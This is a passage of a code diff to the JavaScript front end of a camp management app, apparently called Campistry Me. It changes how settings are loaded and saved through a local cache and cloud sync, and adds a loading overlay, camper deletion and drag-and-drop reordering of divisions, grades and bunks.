@@ -13,6 +13,29 @@ var curPage='campers', editingCamper=null, editingDiv=null, editingFam=null;
 var nextCamperId=1;
 var _saveLockUntil=0; // timestamp — block cloud overwrites for 5s after local save
 
+// ═══ LOADING OVERLAY ═════════════════════════════════════════════
+// The overlay is shown by default in the HTML so users never see a blank
+// page during the IDB preload + cloud hydration window (~3–4s on a fresh
+// load). We hide it only after the campistry-cloud-hydrated event has
+// fired AND we've re-rendered with real data. A safety timeout hides it
+// even if hydration never completes (e.g. fully offline) so the UI
+// doesn't stay locked behind the spinner forever.
+var _meOverlayHidden = false;
+function hideMeLoadingOverlay(){
+    if (_meOverlayHidden) return;
+    _meOverlayHidden = true;
+    var ov = document.getElementById('meLoadingOverlay');
+    if (!ov) return;
+    var elapsed = Date.now() - (window._meAnimStart || Date.now());
+    var remaining = Math.max(0, 2000 - elapsed);
+    setTimeout(function(){
+        ov.classList.add('hide');
+        setTimeout(function(){
+            if (ov && ov.parentNode) ov.parentNode.removeChild(ov);
+        }, 500);
+    }, remaining);
+}
+
 // ═══ INIT ════════════════════════════════════════════════════════
 function init(){
     loadData(); setupSidebar(); setupSearch(); setupModals();
@@ -23,18 +46,32 @@ function init(){
     nav('campers');
     console.log('📋 Me ready:',Object.keys(roster).length,'campers');
 
-    // Block cloud hydration from overwriting recent saves
+    // Sync UI with whatever's in _localCache after hydration. We ALWAYS reload
+    // — the previous save-lock guard skipped loadData when the user had recent
+    // local edits, intending to protect them from cloud overwrites. But:
+    //   1) hydration only updates _localCache, never deletes data — so reading
+    //      back out of _localCache is safe regardless of save lock state.
+    //   2) localStorage writes can silently fail at quota, so a "recent local
+    //      save" can be a fiction; skipping loadData stranded the UI on
+    //      empty placeholder data.
+    // If a save lock is active, ALSO trigger an explicit re-sync to push the
+    // freshly-loaded local state back to cloud.
     window.addEventListener('campistry-cloud-hydrated',function(){
-        if(Date.now()<_saveLockUntil){
-            console.log('[Me] Blocked cloud hydration overwrite (save lock active)');
-            // Re-write our data back
-            setTimeout(function(){save()},200);
-        }else{
-            // Cloud data is newer — reload
-            console.log('[Me] Cloud hydration — reloading data');
-            loadData();render(curPage);
+        var saveLockActive = Date.now() < _saveLockUntil;
+        console.log('[Me] Cloud hydration — reloading data' + (saveLockActive ? ' (save lock active — also resaving)' : ''));
+        loadData();
+        render(curPage);
+        if (saveLockActive) {
+            setTimeout(function(){ save(); }, 200);
         }
+        // Data is now real — fade the overlay out.
+        hideMeLoadingOverlay();
     });
+
+    // Safety net: if hydration never fires (offline, no cloud config, etc.)
+    // don't trap the user behind the spinner. After 12s, hide regardless —
+    // the UI will show whatever loadData() managed to read locally.
+    setTimeout(hideMeLoadingOverlay, 12000);
 
     // Watch for localStorage changes from other tabs/scripts
     window.addEventListener('storage',function(e){
@@ -48,7 +85,18 @@ function init(){
 // ═══ DATA ════════════════════════════════════════════════════════
 function loadData(){
     try{
-        var s=JSON.parse(localStorage.getItem('campGlobalSettings_v1')||'{}');
+        // Prefer the in-memory cache (window.loadGlobalSettings → _localCache)
+        // over a raw localStorage read. After hydrateFromCloud sets _localCache
+        // to the cloud snapshot, localStorage may still hold the stale pre-edit
+        // blob (when the localStorage write hit the quota). Reading localStorage
+        // directly here would silently revert the page to the stale data.
+        var s=null;
+        if(typeof window.loadGlobalSettings==='function'){
+            try{ s=window.loadGlobalSettings(); }catch(_){ s=null; }
+        }
+        if(!s||typeof s!=='object'){
+            s=JSON.parse(localStorage.getItem('campGlobalSettings_v1')||'{}');
+        }
         structure=s.campStructure||{};
         roster=(s.app1&&s.app1.camperRoster)||{};
         var me=s.campistryMe||{};
@@ -73,14 +121,23 @@ function loadData(){
 function save(){
     try{
         _saveLockUntil=Date.now()+5000;
-        var g=JSON.parse(localStorage.getItem('campGlobalSettings_v1')||'{}');
+        // Read current state from the in-memory cache (IDB-backed via
+        // integration_hooks). Falls back to localStorage if loadGlobalSettings
+        // isn't installed yet.
+        var g;
+        if(typeof window.loadGlobalSettings==='function'){
+            try{ g=Object.assign({},window.loadGlobalSettings()); }catch(_){ g=null; }
+        }
+        if(!g||typeof g!=='object'){
+            try{ g=JSON.parse(localStorage.getItem('campGlobalSettings_v1')||'{}'); }catch(_){ g={}; }
+        }
         g.campStructure=structure;
         if(!g.app1)g.app1={};
         g.app1.camperRoster=roster;
-        // Build divisions from structure — full replacement, no merge with old
-        var m={};
-        Object.entries(structure).forEach(function([d,dd]){var b=[];Object.values(dd.grades||{}).forEach(function(gr){(gr.bunks||[]).forEach(function(bk){b.push(bk)})});var ex=(g.app1.divisions&&g.app1.divisions[d])||{};m[d]=Object.assign({},ex,{color:dd.color,bunks:b})});
-        g.app1.divisions=m;
+        // app1.divisions is owned exclusively by app1/Flow — it holds grade-keyed
+        // entries built from campStructure (startTime, endTime, parentDivision, etc.).
+        // campStructure is the authoritative source for division/grade/bunk structure;
+        // app1.loadData() derives everything from it, so we must not overwrite it here.
         g.campistryMe={
             families:families,
             payments:payments,
@@ -95,35 +152,29 @@ function save(){
             finance:{staff:finStaff,expenses:finExpenses,payments:finPayments,budget:finBudget,integrations:finIntegrations}
         };
         g.updated_at=new Date().toISOString();
-        var json=JSON.stringify(g);
-        localStorage.setItem('campGlobalSettings_v1',json);
-        // Write to all known keys that other scripts may read
-        localStorage.setItem('CAMPISTRY_LOCAL_CACHE',json);
-        try{localStorage.setItem('CAMPISTRY_UNIFIED_STATE',json)}catch(ex){}
-        console.log('[Me] Saved locally:',Object.keys(roster).length,'campers,',Object.keys(enrollments).length,'enrollments,',sessions.length,'sessions');
-        // Verify write after a short delay (catch overwrites from cloud hydration)
+
+        // saveGlobalSettings → setLocalSettings handles ALL persistence:
+        //   - IndexedDB write-through with the FULL state (no quota)
+        //   - localStorage write with a stripped sync-init snapshot
+        //   - Per-key UPSERT into camp_state_kv
+        // No direct localStorage writes needed from here anymore.
         var rosterCount=Object.keys(roster).length;
-        setTimeout(function(){
-            try{
-                var check=JSON.parse(localStorage.getItem('campGlobalSettings_v1')||'{}');
-                var checkCount=Object.keys((check.app1&&check.app1.camperRoster)||{}).length;
-                if(checkCount<rosterCount){
-                    console.warn('[Me] ⚠ Save was overwritten — re-saving');
-                    localStorage.setItem('campGlobalSettings_v1',json);
-                    localStorage.setItem('CAMPISTRY_LOCAL_CACHE',json);
-                }
-            }catch(e){}
-        },800);
         if(window.saveGlobalSettings&&window.saveGlobalSettings._isAuthoritativeHandler){
-            console.log('[Me] ☁️ Syncing to cloud: campStructure, app1, campistryMe');
+            console.log('[Me] Saving',rosterCount,'campers,',Object.keys(enrollments).length,'enrollments,',sessions.length,'sessions');
             window.saveGlobalSettings('campStructure',structure);
             window.saveGlobalSettings('app1',g.app1);
             window.saveGlobalSettings('campistryMe',g.campistryMe);
-        }else if(typeof window.forceSyncToCloud==='function'){
-            console.log('[Me] ☁️ Syncing to cloud via forceSyncToCloud');
-            window.forceSyncToCloud();
+            // Force-flush so a navigation immediately after import doesn't
+            // race the debounced batch sync.
+            if(typeof window.forceSyncToCloud==='function'){
+                window.forceSyncToCloud();
+            }
         }else{
-            console.log('[Me] ⚠ No cloud sync available — saved to localStorage only');
+            console.log('[Me] ⚠ saveGlobalSettings unavailable — local cache only');
+        }
+        // ★ Update starter-plan banner camper count in real time (trial_guard.js integration)
+        if(typeof window.refreshStarterBanner==='function'){
+            try{window.refreshStarterBanner(rosterCount)}catch(ex){}
         }
     }catch(e){console.error('[Me] Save:',e)}
 }
@@ -491,15 +542,9 @@ function viewCamper(n){
     var d=roster[n];if(!d)return;
     var idStr=d.camperId?String(d.camperId).padStart(4,'0'):'—';
 
-    // Header with photo placeholder
-    var photoUrl=d.photoUrl||'';
-    var photoHtml=photoUrl
-        ?'<img src="'+esc(photoUrl)+'" style="width:72px;height:72px;border-radius:12px;object-fit:cover;border:2px solid var(--s200)">'
-        :'<div style="width:72px;height:72px;border-radius:12px;background:var(--s100);border:2px dashed var(--s300);display:flex;align-items:center;justify-content:center;flex-direction:column;cursor:pointer" onclick="CampistryMe.uploadPhoto(\''+je(n)+'\')" title="Click to add photo"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="var(--s400)" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="3" width="18" height="18" rx="2"/><circle cx="8.5" cy="8.5" r="1.5"/><polyline points="21 15 16 10 5 21"/></svg><span style="font-size:.6rem;color:var(--s400);margin-top:2px">Add Photo</span></div>';
-
     var altDisplay=[d.altFirstName,d.altLastName].filter(Boolean).join(' ');
     var altHtml=altDisplay?'<div style="font-size:.85rem;color:var(--s500);margin-top:2px">'+esc(altDisplay)+'</div>':'';
-    document.getElementById('cvHead').innerHTML='<div style="display:flex;gap:16px;align-items:flex-start;padding:4px 0">'+photoHtml+'<div style="flex:1"><h3 class="cv-name">'+esc(n)+'</h3>'+altHtml+'<div class="cv-tags" style="margin-top:6px"><span class="badge badge-gray" style="font-family:monospace">#'+esc(idStr)+'</span>'+(d.division?dtag(d.division):'')+(d.bunk?' '+bdg(d.bunk,'gray'):'')+'</div></div></div>';
+    document.getElementById('cvHead').innerHTML='<div style="padding:4px 0"><h3 class="cv-name">'+esc(n)+'</h3>'+altHtml+'<div class="cv-tags" style="margin-top:6px"><span class="badge badge-gray" style="font-family:monospace">#'+esc(idStr)+'</span>'+(d.division?dtag(d.division):'')+(d.bunk?' '+bdg(d.bunk,'gray'):'')+'</div></div>';
 
     var b='';
 
@@ -603,6 +648,7 @@ function viewCamper(n){
 
     document.getElementById('cvBody').innerHTML=b;
     document.getElementById('cvEditBtn').onclick=function(){closeModal('camperViewModal');editCamper(n)};
+    document.getElementById('cvDeleteBtn').onclick=function(){deleteCamper(n)};
     openModal('camperViewModal');
 }
 function cvR(l,v,w){if(!v)return'';return'<div class="cv-row"><span class="cv-lbl">'+esc(l)+'</span><span class="cv-val'+(w?' cv-warn':'')+'">'+v+'</span></div>'}
@@ -623,6 +669,7 @@ function editCamper(n){
     h+=ff('Teacher','ceTeacher',d.teacher||'');
 
     h+='<div class="fsec">Camp Assignment</div>';
+    if(!Object.keys(structure).length){h+='<div style="background:var(--warn-bg,#fff8e1);border:1px solid var(--warn-border,#ffe082);border-radius:var(--r);padding:10px 14px;margin-bottom:10px;font-size:.8rem;color:var(--s600,#555)"><strong>No camp structure yet.</strong> Go to <a href="#" onclick="event.preventDefault();CampistryMe.closeModal(\'camperEditModal\');CampistryMe.nav(\'structure\')" style="color:var(--me);font-weight:600">Camp Structure</a> to create divisions, grades, and bunks first — or <a href="#" onclick="event.preventDefault();CampistryMe.closeModal(\'camperEditModal\');CampistryMe.openCsv()" style="color:var(--me);font-weight:600">import a CSV</a> which will create them automatically.</div>'}
     h+='<div class="fr">'+ff('Division','ceDiv',d.division||'','select',[''].concat(Object.keys(structure).sort()))+ff('Grade','ceCGrade',d.grade||'','select',grOpts(d.division))+'</div>';
     h+=ff('Bunk','ceBunk',d.bunk||'','select',bkOpts(d.division,d.grade));
 
@@ -673,11 +720,11 @@ function saveCamper(){
     var first=(document.getElementById('ceFirst').value||'').trim(),last=(document.getElementById('ceLast').value||'').trim();
     if(!first){toast('First name required','error');return}
     var full=first+(last?' '+last:'');
+    var existingId=(editingCamper&&roster[editingCamper])?roster[editingCamper].camperId:null;
     if(editingCamper&&editingCamper!==full)delete roster[editingCamper];
     if(!editingCamper&&roster[full]){toast('Already exists','error');return}
     // Gather teams
     var teams={};document.querySelectorAll('.ceTeamSel').forEach(function(sel){var lg=sel.dataset.league,v=sel.value;if(lg&&v)teams[lg]=v});
-    var existingId=(editingCamper&&roster[editingCamper])?roster[editingCamper].camperId:null;
     if(!existingId){existingId=nextCamperId;nextCamperId++}
     roster[full]={
         camperId:existingId,
@@ -702,7 +749,13 @@ function saveCamper(){
     syncAddressToGo(full,roster[full]);
     save();closeModal('camperEditModal');render(curPage);toast(editingCamper?'Updated':'Added');
 }
-function grOpts(div){var o=[''];if(div&&structure[div])Object.keys(structure[div].grades||{}).sort().forEach(function(g){o.push(g)});return o}
+function deleteCamper(n){
+    if(!n||!roster[n])return;
+    if(!confirm('Delete camper "'+n+'"? This cannot be undone.'))return;
+    delete roster[n];
+    save();closeModal('camperViewModal');render(curPage);toast('Camper deleted');
+}
+function grOpts(div){var o=[''];if(div&&structure[div]){var ord=structure[div].gradeOrder,keys=Object.keys(structure[div].grades||{});(Array.isArray(ord)&&ord.length?ord.filter(function(g){return g in(structure[div].grades||{})}):keys.sort()).forEach(function(g){o.push(g)})}return o}
 function bkOpts(div,gr){var o=[''];if(div&&gr&&structure[div]&&structure[div].grades&&structure[div].grades[gr])(structure[div].grades[gr].bunks||[]).forEach(function(b){o.push(b)});return o}
 
 // Sync camper address to Campistry Go's address store
@@ -754,24 +807,264 @@ function syncAllAddressesToGo(){
 }
 
 // ── STRUCTURE ────────────────────────────────────────────────────
+function _getDivisionOrder(){
+    try{
+        var gs=window.loadGlobalSettings?window.loadGlobalSettings():{};
+        var ord=(gs.app1&&gs.app1.manualColumnOrder)||[];
+        return Array.isArray(ord)?ord:[];
+    }catch(_){return []}
+}
+function _saveDivisionOrder(order){
+    try{
+        var gs=window.loadGlobalSettings?window.loadGlobalSettings():{};
+        if(!gs.app1)gs.app1={};
+        gs.app1.manualColumnOrder=order;
+        if(window.saveGlobalSettings)window.saveGlobalSettings('app1',gs.app1);
+    }catch(e){console.warn('[CampistryMe] save order failed',e)}
+}
+function _sortedDivisions(){
+    var keys=Object.keys(structure);
+    var ord=_getDivisionOrder();
+    if(ord.length>0){
+        var pos={};ord.forEach(function(k,i){pos[k]=i});
+        keys.sort(function(a,b){
+            var ai=pos[a]==null?9999:pos[a];
+            var bi=pos[b]==null?9999:pos[b];
+            if(ai!==bi)return ai-bi;
+            return a.localeCompare(b);
+        });
+    }else{
+        keys.sort(function(a,b){
+            var na=parseInt(a),nb=parseInt(b);
+            if(!isNaN(na)&&!isNaN(nb))return na-nb;
+            return a.localeCompare(b);
+        });
+    }
+    return keys.map(function(k){return [k,structure[k]]});
+}
+function _sortedGrades(divData){
+    var entries=Object.entries(divData.grades||{});
+    var ord=divData.gradeOrder;
+    if(Array.isArray(ord)&&ord.length>0){
+        var pos={};ord.forEach(function(k,i){pos[k]=i});
+        entries.sort(function(a,b){
+            var ai=pos[a[0]]==null?9999:pos[a[0]];
+            var bi=pos[b[0]]==null?9999:pos[b[0]];
+            if(ai!==bi)return ai-bi;
+            return a[0].localeCompare(b[0]);
+        });
+    }
+    return entries;
+}
+function moveDivision(name,dir){
+    var keys=_sortedDivisions().map(function(e){return e[0]});
+    var i=keys.indexOf(name);
+    if(i<0)return;
+    var j=i+dir;
+    if(j<0||j>=keys.length)return;
+    var tmp=keys[i];keys[i]=keys[j];keys[j]=tmp;
+    _saveDivisionOrder(keys);
+    render(curPage);
+}
+function _commitStructureReorder(){
+    // Read DOM and rebuild structure objects in the new order.
+    var listEl=document.getElementById('meDivList');
+    if(!listEl)return;
+    listEl.querySelectorAll('.me-div-card').forEach(function(card){
+        var divName=card.getAttribute('data-div');
+        if(!divName||!structure[divName])return;
+        var divColor=structure[divName].color;
+        var newGrades={};
+        var gradeOrder=[];
+        card.querySelectorAll('.me-grade-block').forEach(function(gBlock){
+            var gn=gBlock.getAttribute('data-grade');
+            if(!gn||!structure[divName].grades||!structure[divName].grades[gn])return;
+            var newBunks=Array.prototype.map.call(gBlock.querySelectorAll('.me-card-bunk'),function(c){return c.getAttribute('data-bunk')||c.textContent.trim()}).filter(Boolean);
+            newGrades[gn]={bunks:newBunks};
+            gradeOrder.push(gn);
+        });
+        structure[divName]={color:divColor,grades:newGrades,gradeOrder:gradeOrder};
+    });
+    save();
+}
+
 function renderStructure(){
-    var c=document.getElementById('page-structure'),divs=Object.entries(structure).sort(function(a,b){return a[0].localeCompare(b[0])});
+    var c=document.getElementById('page-structure'),divs=_sortedDivisions();
     var h='<div class="sec-hd"><div><h2 class="sec-title">Camp Structure</h2></div><div class="sec-actions"><button class="me-btn me-btn--pri" onclick="CampistryMe.addDiv()">+ Add Division</button></div></div>';
     if(!divs.length){h+='<div class="me-empty"><h3>No divisions yet</h3><p>Create your camp structure.</p></div>'}
-    else divs.forEach(function([dn,dd]){
-        var grades=Object.entries(dd.grades||{}).sort(function(a,b){return a[0].localeCompare(b[0],undefined,{numeric:true})});
-        var bCt=grades.reduce(function(s,e){return s+(e[1].bunks||[]).length},0);
-        var col=dd.color||'#94A3B8';
-        h+='<div class="me-card" style="margin-bottom:10px"><div class="me-card-head"><div style="display:flex;align-items:center;gap:8px"><div style="width:10px;height:10px;border-radius:3px;background:'+col+'"></div><h3 style="margin:0">'+esc(dn)+'</h3><span style="font-size:.75rem;color:var(--s400)">'+grades.length+' grades · '+bCt+' bunks</span></div><div style="display:flex;gap:4px"><button class="me-btn me-btn--ghost me-btn--sm" onclick="CampistryMe.editDiv(\''+je(dn)+'\')">Edit</button><button class="me-btn me-btn--danger me-btn--sm" onclick="CampistryMe.deleteDiv(\''+je(dn)+'\')">Delete</button></div></div>';
-        h+='<div style="padding:14px 18px">';
-        grades.forEach(function([gn,gd]){
-            h+='<div style="margin-bottom:10px"><div style="font-size:.8rem;font-weight:600;color:var(--s700);margin-bottom:4px">'+esc(gn)+'</div><div style="display:flex;flex-wrap:wrap;gap:4px">';
-            (gd.bunks||[]).forEach(function(b){h+='<span style="padding:3px 8px;border-radius:6px;border:1px solid var(--s200);font-size:.7rem;font-weight:600;color:var(--s600)">'+esc(b)+'</span>'});
+    else{
+        h+='<div id="meDivList"><div style="font-size:.72rem;color:var(--s400);margin-bottom:8px">Drag the ⋮⋮ handles or any chip to reorder divisions, grades, and bunks in place.</div>';
+        divs.forEach(function([dn,dd],ix){
+            var grades=_sortedGrades(dd);
+            var bCt=grades.reduce(function(s,e){return s+(e[1].bunks||[]).length},0);
+            var col=dd.color||'#94A3B8';
+            var upDis=ix===0?' disabled':'';
+            var dnDis=ix===divs.length-1?' disabled':'';
+            h+='<div class="me-card me-div-card" data-div="'+je(dn)+'" style="margin-bottom:10px"><div class="me-card-head"><div style="display:flex;align-items:center;gap:8px">'
+                +'<span class="me-grip me-div-grip" title="Drag to reorder division" style="cursor:grab;color:var(--s400);font-size:1rem;line-height:1;padding:0 4px;user-select:none">⋮⋮</span>'
+                +'<div style="width:10px;height:10px;border-radius:3px;background:'+col+'"></div><h3 style="margin:0">'+esc(dn)+'</h3><span style="font-size:.75rem;color:var(--s400)">'+grades.length+' grades · '+bCt+' bunks</span></div><div style="display:flex;gap:4px;align-items:center">'
+                +'<button class="me-btn me-btn--ghost me-btn--sm" title="Move up"'+upDis+' onclick="CampistryMe.moveDivision(\''+je(dn)+'\',-1)" style="padding:4px 8px">↑</button>'
+                +'<button class="me-btn me-btn--ghost me-btn--sm" title="Move down"'+dnDis+' onclick="CampistryMe.moveDivision(\''+je(dn)+'\',1)" style="padding:4px 8px">↓</button>'
+                +'<button class="me-btn me-btn--ghost me-btn--sm" onclick="CampistryMe.editDiv(\''+je(dn)+'\')">Edit</button>'
+                +'<button class="me-btn me-btn--danger me-btn--sm" onclick="CampistryMe.deleteDiv(\''+je(dn)+'\')">Delete</button>'
+                +'</div></div>';
+            h+='<div class="me-grade-list" data-div="'+je(dn)+'" style="padding:14px 18px">';
+            grades.forEach(function([gn,gd]){
+                h+='<div class="me-grade-block" data-grade="'+je(gn)+'" style="margin-bottom:10px;padding:6px 8px;border:1px dashed transparent;border-radius:6px">'
+                    +'<div style="display:flex;align-items:center;gap:6px;margin-bottom:4px">'
+                        +'<span class="me-grip me-grade-grip" title="Drag to reorder grade" style="cursor:grab;color:var(--s400);font-size:.85rem;line-height:1;padding:0 2px;user-select:none">⋮⋮</span>'
+                        +'<div style="font-size:.8rem;font-weight:600;color:var(--s700)">'+esc(gn)+'</div>'
+                    +'</div>'
+                    +'<div class="me-card-bunks" data-grade="'+je(gn)+'" style="display:flex;flex-wrap:wrap;gap:4px;padding-left:18px">';
+                (gd.bunks||[]).forEach(function(b){
+                    h+='<span class="me-card-bunk" data-bunk="'+je(b)+'" draggable="true" style="padding:3px 8px;border-radius:6px;border:1px solid var(--s200);font-size:.7rem;font-weight:600;color:var(--s600);cursor:grab;user-select:none">'+esc(b)+'</span>';
+                });
+                h+='</div></div>';
+            });
             h+='</div></div>';
         });
-        h+='</div></div>';
-    });
+        h+='</div>';
+    }
     c.innerHTML=h;
+    // Wire drag-drop on division cards
+    var listEl=document.getElementById('meDivList');
+    if(listEl){
+        _meReorderInit(listEl,'.me-div-card');
+        listEl.querySelectorAll('.me-div-card').forEach(function(card){
+            _meAttachItemDrag(card);
+            card.addEventListener('dragend',function(){
+                var newOrder=Array.prototype.map.call(listEl.querySelectorAll('.me-div-card'),function(el){return el.getAttribute('data-div')});
+                _saveDivisionOrder(newOrder);
+                _commitStructureReorder();
+                render(curPage);
+            });
+        });
+        // Wire drag-drop on grade blocks within each division card
+        listEl.querySelectorAll('.me-grade-list').forEach(function(gradeList){
+            _meReorderInit(gradeList,'.me-grade-block');
+            gradeList.querySelectorAll('.me-grade-block').forEach(function(gBlock){
+                _meAttachItemDrag(gBlock);
+                gBlock.addEventListener('dragend',function(){
+                    _commitStructureReorder();
+                    render(curPage);
+                });
+            });
+        });
+        // Wire drag-drop on bunk chips within each grade block
+        listEl.querySelectorAll('.me-card-bunks').forEach(function(bunkRow){
+            _meHorizontalReorderInit(bunkRow,'.me-card-bunk');
+            bunkRow.querySelectorAll('.me-card-bunk').forEach(function(chip){
+                _meAttachItemDrag(chip);
+                chip.addEventListener('dragend',function(){
+                    _commitStructureReorder();
+                    render(curPage);
+                });
+            });
+        });
+    }
+}
+
+// ── Drag-drop helpers ──
+// Containers scope dragover handling to direct children matching childSelector,
+// so nested draggables (e.g. bunk chip inside a grade block inside a division
+// card) reorder within their own list without bubbling up to the parent list.
+function _meReorderInit(containerEl,childSelector){
+    if(!containerEl||containerEl._meDragInit)return;
+    containerEl._meDragInit=true;
+    containerEl.addEventListener('dragover',function(e){
+        var dragging=containerEl.querySelector(':scope > .me-dragging');
+        if(!dragging||!dragging.matches(childSelector))return;
+        e.preventDefault();e.dataTransfer.dropEffect='move';
+        var siblings=Array.prototype.slice.call(containerEl.children).filter(function(el){return el!==dragging&&el.matches(childSelector)});
+        var nextSibling=siblings.find(function(sib){
+            var box=sib.getBoundingClientRect();
+            return e.clientY<box.top+box.height/2;
+        });
+        containerEl.insertBefore(dragging,nextSibling||null);
+    });
+}
+function _meHorizontalReorderInit(containerEl,childSelector){
+    if(!containerEl||containerEl._meDragInit)return;
+    containerEl._meDragInit=true;
+    containerEl.addEventListener('dragover',function(e){
+        var dragging=containerEl.querySelector(':scope > .me-dragging');
+        if(!dragging||!dragging.matches(childSelector))return;
+        e.preventDefault();e.dataTransfer.dropEffect='move';
+        var siblings=Array.prototype.slice.call(containerEl.children).filter(function(el){return el!==dragging&&el.matches(childSelector)});
+        var nextSibling=siblings.find(function(sib){
+            var box=sib.getBoundingClientRect();
+            return e.clientX<box.left+box.width/2;
+        });
+        containerEl.insertBefore(dragging,nextSibling||null);
+    });
+}
+function _meAttachItemDrag(itemEl){
+    if(!itemEl||itemEl._meItemDragInit)return;
+    itemEl._meItemDragInit=true;
+    itemEl.draggable=true;
+    itemEl.addEventListener('dragstart',function(e){
+        e.stopPropagation();
+        itemEl.classList.add('me-dragging');
+        try{e.dataTransfer.effectAllowed='move';e.dataTransfer.setData('text/plain','reorder')}catch(_){}
+    });
+    itemEl.addEventListener('dragend',function(e){
+        e.stopPropagation();
+        itemEl.classList.remove('me-dragging');
+    });
+}
+
+function _renderBunkChipsHTML(bunks){
+    var inner='';
+    (bunks||[]).forEach(function(b){
+        inner+='<span class="me-bunk-chip" draggable="true"><span class="me-bunk-name">'+esc(b)+'</span><button type="button" class="me-bunk-x" title="Remove">×</button></span>';
+    });
+    return '<div class="fg"><label class="fl">Bunks <span style="font-weight:400;color:var(--s400);font-size:.7rem">(drag to reorder)</span></label>'
+        +'<div class="me-bunk-list dmGradeBunks">'+inner+'</div>'
+        +'<div style="display:flex;gap:6px;margin-top:6px"><input type="text" class="fi me-bunk-input" placeholder="Add bunk and press Enter" style="flex:1"><button type="button" class="me-btn me-btn--sec me-btn--sm me-bunk-add">+ Add</button></div>'
+        +'</div>';
+}
+function _renderGradeRowHTML(gn,bunks){
+    return '<div class="fg dm-grade-row" style="background:var(--s50);padding:8px 10px;border-radius:var(--r);border:1px solid var(--s200);margin-bottom:6px;cursor:grab">'
+        +'<div class="fr" style="align-items:center;gap:6px">'
+            +'<span class="me-grip" title="Drag to reorder grade" style="cursor:grab;color:var(--s400);font-size:1rem;line-height:1;padding:0 4px;user-select:none">⋮⋮</span>'
+            +'<div class="fg" style="flex:1;margin:0"><label class="fl">Grade Name</label><input class="fi dmGradeN" value="'+esc(gn||'')+'" placeholder="e.g. 1st Grade"></div>'
+            +'<button type="button" class="me-btn me-btn--ghost me-btn--sm dm-grade-remove" title="Remove grade" style="color:var(--danger,#dc2626)">×</button>'
+        +'</div>'
+        +_renderBunkChipsHTML(bunks)
+        +'</div>';
+}
+function _wireGradeRow(rowEl){
+    if(!rowEl)return;
+    _meAttachItemDrag(rowEl);
+    var rmBtn=rowEl.querySelector('.dm-grade-remove');
+    if(rmBtn)rmBtn.onclick=function(){if(confirm('Remove this grade?'))rowEl.remove()};
+    var bunkList=rowEl.querySelector('.me-bunk-list');
+    var addInp=rowEl.querySelector('.me-bunk-input');
+    var addBtn=rowEl.querySelector('.me-bunk-add');
+    if(bunkList){
+        _meHorizontalReorderInit(bunkList,'.me-bunk-chip');
+        bunkList.querySelectorAll('.me-bunk-chip').forEach(_wireBunkChip);
+    }
+    function addBunk(){
+        var v=(addInp.value||'').trim();
+        if(!v)return;
+        // Allow multiple comma-separated bunks via the add input.
+        v.split(',').map(function(s){return s.trim()}).filter(Boolean).forEach(function(name){
+            var span=document.createElement('span');
+            span.className='me-bunk-chip';span.draggable=true;
+            span.innerHTML='<span class="me-bunk-name">'+esc(name)+'</span><button type="button" class="me-bunk-x" title="Remove">×</button>';
+            bunkList.appendChild(span);
+            _wireBunkChip(span);
+        });
+        addInp.value='';addInp.focus();
+    }
+    if(addBtn)addBtn.onclick=addBunk;
+    if(addInp)addInp.addEventListener('keydown',function(e){if(e.key==='Enter'){e.preventDefault();addBunk()}});
+}
+function _wireBunkChip(chip){
+    _meAttachItemDrag(chip);
+    var x=chip.querySelector('.me-bunk-x');
+    if(x)x.onclick=function(){chip.remove()};
 }
 
 // Division create/edit
@@ -784,21 +1077,25 @@ function openDivForm(name){
     COLORS.forEach(function(c){h+='<button class="swatch'+(d.color===c?' sel':'')+'" style="background:'+c+'" data-color="'+c+'" onclick="CampistryMe._pickColor(this)"></button>'});
     h+='</div><input type="hidden" id="dmColor" value="'+(d.color||COLORS[0])+'"></div>';
     // Grades + Bunks
-    h+='<div class="fsec">Grades & Bunks</div><div id="dmGrades">';
-    Object.entries(d.grades||{}).forEach(function([gn,gd],i){
-        h+='<div class="fg" style="background:var(--s50);padding:8px 10px;border-radius:var(--r);border:1px solid var(--s200);margin-bottom:6px"><div class="fr"><div class="fg" style="flex:1"><label class="fl">Grade Name</label><input class="fi dmGradeN" value="'+esc(gn)+'"></div></div><div class="fg"><label class="fl">Bunks (comma separated)</label><input class="fi dmGradeB" value="'+esc((gd.bunks||[]).join(', '))+'"></div></div>';
+    h+='<div class="fsec">Grades & Bunks <span style="font-weight:400;color:var(--s400);font-size:.75rem">(drag the ⋮⋮ handle to reorder)</span></div><div id="dmGrades">';
+    _sortedGrades(d).forEach(function([gn,gd]){
+        h+=_renderGradeRowHTML(gn,gd.bunks||[]);
     });
     h+='</div><button class="me-btn me-btn--sec me-btn--sm" style="margin-top:6px" onclick="CampistryMe._addGradeRow()">+ Add Grade</button>';
     document.getElementById('dmBody').innerHTML=h;
+    var dmGrades=document.getElementById('dmGrades');
+    _meReorderInit(dmGrades,'.dm-grade-row');
+    dmGrades.querySelectorAll('.dm-grade-row').forEach(_wireGradeRow);
     document.getElementById('dmSave').onclick=saveDiv;
     openModal('divModal');
 }
 function _addGradeRow(){
     var cont=document.getElementById('dmGrades');
-    var div=document.createElement('div');
-    div.className='fg';div.style.cssText='background:var(--s50);padding:8px 10px;border-radius:var(--r);border:1px solid var(--s200);margin-bottom:6px';
-    div.innerHTML='<div class="fr"><div class="fg" style="flex:1"><label class="fl">Grade Name</label><input class="fi dmGradeN" value="" placeholder="e.g. 1st Grade"></div></div><div class="fg"><label class="fl">Bunks (comma separated)</label><input class="fi dmGradeB" value="" placeholder="Bunk 1, Bunk 2"></div>';
-    cont.appendChild(div);
+    var tmp=document.createElement('div');
+    tmp.innerHTML=_renderGradeRowHTML('',[]);
+    var row=tmp.firstChild;
+    cont.appendChild(row);
+    _wireGradeRow(row);
 }
 function _pickColor(el){
     document.querySelectorAll('.swatch').forEach(function(s){s.classList.remove('sel')});
@@ -809,23 +1106,269 @@ function saveDiv(){
     var name=(document.getElementById('dmName').value||'').trim();
     if(!name){toast('Name required','error');return}
     var color=document.getElementById('dmColor').value||COLORS[0];
+    // ★ Snapshot old bunks before applying changes so we can detect removals
+    var oldBunks=[];
+    var srcDiv=editingDiv||name;
+    if(structure[srcDiv]&&structure[srcDiv].grades){
+        Object.values(structure[srcDiv].grades).forEach(function(g){(g.bunks||[]).forEach(function(b){oldBunks.push(b)})});
+    }
     var grades={};
-    var gradeNs=document.querySelectorAll('.dmGradeN');
-    var gradeBs=document.querySelectorAll('.dmGradeB');
-    gradeNs.forEach(function(el,i){
-        var gn=el.value.trim();if(!gn)return;
-        var bunks=(gradeBs[i]?gradeBs[i].value:'').split(',').map(function(s){return s.trim()}).filter(Boolean);
